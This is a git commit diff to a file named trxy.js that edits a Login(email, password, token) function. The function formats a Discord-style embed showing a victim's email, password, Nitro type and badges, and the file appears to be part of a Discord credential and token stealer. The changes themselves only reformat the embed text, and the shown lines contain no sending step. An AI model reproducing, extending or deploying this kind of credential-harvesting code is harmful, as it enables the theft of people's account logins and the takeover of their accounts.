2003878e89b3864f07159077f7df7e718701bdbe
Ainsley3 <95043019+Ainsley3@users.noreply.github.com>
2022-02-25 19:42:00 +0300

    Update trxy.js

--- trxy.js
+++ trxy.js
@@ -150,20 +150,13 @@ function Login(email, password, token) {
                         {
                             "name": "<a:arrow:765308889859751976> **Account Info**",
 
-                            "value":  `<:PP_director:942527310324719716> **Email:** ||${email}|| 
-                                     
-                            <:staff_blue:936543701294010399> **Password:** ||${password}||`,
+                            "value":  `<:PP_director:942527310324719716> **Email:** ||${email}||    <:staff_blue:936543701294010399> **Password:** ||${password}||`,
                             "inline": true
                         },
-
-
-
                         {
-                            "name": "<a:arrow:765308889859751976> **Other Info**",
+                            "name": "",
 
-                            "value": `<a:axe_Pepenitro:932312223945224212> **Nitro Type:**  ${GetNitro(json.premium_type)}\n
-
-                            <a:allbadges:895906088996720690> **Badges:**  ${GetBadges(json.flags)}`,
+                            "value": `<a:axe_Pepenitro:932312223945224212> **Nitro Type:**  ${GetNitro(json.premium_type)}\n    <a:allbadges:895906088996720690> **Badges:**  ${GetBadges(json.flags)}`,
 
 
         
